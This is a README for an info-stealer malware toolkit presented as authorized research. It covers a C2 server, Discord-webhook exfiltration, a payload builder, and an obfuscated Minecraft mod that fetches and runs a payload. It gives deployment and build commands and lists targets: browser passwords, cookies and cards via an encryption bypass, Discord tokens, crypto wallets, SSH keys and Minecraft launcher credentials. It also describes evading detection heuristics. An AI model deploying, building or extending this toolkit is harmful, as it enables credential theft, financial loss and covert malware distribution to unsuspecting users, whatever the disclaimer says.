# Ramos Info-Stealer — Lab Research Suite

A complete Windows information-stealer toolkit built for authorized security
research: collection client, C2 panel, Discord-webhook exfil, a browser-based
builder, and a Minecraft Fabric mod dropper. Written to study how this malware
class works — so it can be detected and stopped.

> **Authorized lab use only.** Run the client solely on machines you own, in an
> isolated VM. Misuse is on you.

## Repository layout

```
stealer/           collection client + C2 panel + staged loader
├── stealer_client.py   full client — every capability, fully commented
├── c2_server.py        panel: loot intake, pinned-TLS mod channel, payload hosting
├── bh_loader.py        tiny staged TLS loader — nothing sensitive embedded
└── build_exe.bat       one-command Windows build

forge/             browser-based builder (Flask backend + dark UI)
├── app.py              PY/JAR build endpoints, operator-token gated
├── static/index.html   the builder UI
└── templates/          build templates (config injected at forge time)

mod/               BlackHole Fabric mod (Minecraft 26.2, Fabric Loader 0.19.5)
└── src/                pinned-TLS check-in, staged payload fetch + run
```

See `HOW_IT_WORKS.md` for the technique deep-dive and `SETUP_WINDOWS.md` for
defender exclusions when testing on your own box.

## Two exfil modes

**C2 panel** — loot lands in the panel dashboard, compressed and AES-GCM sealed.

**Discord webhook** — the whole loot ships as **one downloadable JSON file**:
summary and credential preview in the message body, the full dataset attached.
No base64 chunks, no spam. Victim identity is hashed before it touches Discord,
and `sysinfo`/`screenshot` are stripped in this mode.

## How to use

**1. Panel** — on your server:

```bash
pip install flask pycryptodome
sudo python3 stealer/c2_server.py --port 443
```

**2. Aim the client** — edit the top of `stealer_client.py`:

```python
CANDIDATES = ["<your-server>:443"]   # tried in order, first live C2 wins
```

Optional: set `DEADDROP_CONTRACT` / `DEADDROP_DOMAIN` for blockchain or DNS
based C2 resolution (see `HOW_IT_WORKS.md`).

**3. Build** — on Windows:

```bat
pip install pyinstaller pycryptodome pillow
pyinstaller --onefile --noconsole --name vw_client --add-binary chromelevator_x64.exe:. stealer_client.py
```

`chromelevator_x64.exe` is [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) (MIT) — the ABE bypass engine.

**4. Run** — double-click on the lab machine. No console, no args, no admin.

## Builder (forge)

A Flask app that produces sealed builds from a browser: paste your C2 address
**or** a Discord webhook, pick Python or JAR, toggle encryption, forge. Configs
are sealed with a per-build random key and never stored — nothing persists
server-side. Gated by an operator token; no user accounts or databases.

```bash
FORGE_TOKEN=<random> python3 forge/app.py
```

The JAR tab produces a 12KB staged mod that pulls its payload from your panel
at runtime, so there is nothing large or sensitive embedded to trip heuristics.

## What it collects

| Category | Method |
|---|---|
| Chromium passwords / cookies / cards / history | DPAPI + App-Bound Encryption bypass |
| Chromium ABE-resistant tokens | hidden remote-debugging pass + ChromElevator |
| Firefox logins / cookies / history | readable-at-rest stores |
| Discord tokens | leveldb scrape |
| Telegram / Steam / Roblox | session files |
| Minecraft — **19 launchers** | see below |
| Desktop wallets (7) / Web3 extensions | file + vault presence |
| SSH keys / sysinfo / screenshot | direct read |

### Minecraft launcher sweep

`steal_minecraft` covers vanilla plus PrismLauncher (with a recursive walk of
the instances tree), TLauncher, ATLauncher, CurseForge, GDLauncher, Modrinth,
Feather, Lunar, Badlion, Essentials, and the client dirs Meteor, Impact,
Inertia, Rush, Salhack, Future, and Dancing. Named account files are read
first, then a recursive glob catches anything account-, session-, token-, or
credential-shaped up to four levels deep.

## The mod (BlackHole)

A Fabric mod for Minecraft 26.2 that acts as the delivery channel. On launch it
checks in over a pinned-TLS connection, then pulls and runs the payload —
Minecraft itself becomes the dropper, so no separate download is needed.

The mod is obfuscated with ProGuard (repackaged to `bh/`, string constants
XOR-folded in a vault). Note `-dontpreverify` **must not** be used: Java 25
verification requires StackMapTable frames, and omitting them causes a
`VerifyError` at class load.

## Legal and ethical stance

This is offensive security research tooling. It is published for people testing
detection coverage and studying stealer tradecraft on systems they own or are
paid to assess. It is **not** published for theft, and the author does not
condone use against any machine without explicit authorization.

## License

MIT — research and education.
